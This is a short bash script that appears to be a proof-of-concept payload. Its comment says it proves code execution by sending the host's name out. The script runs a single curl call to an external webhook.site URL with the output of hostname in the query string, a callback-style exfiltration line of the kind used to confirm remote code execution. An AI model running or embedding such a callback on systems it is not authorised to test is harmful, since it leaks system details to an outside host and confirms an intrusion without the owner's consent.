#!/bin/bash
# Send just the hostname to prove code execution
curl -s "https://webhook.site/9664b335-8df6-4405-97e2-202d1a4b563a?host=$(hostname)&proof=yes"
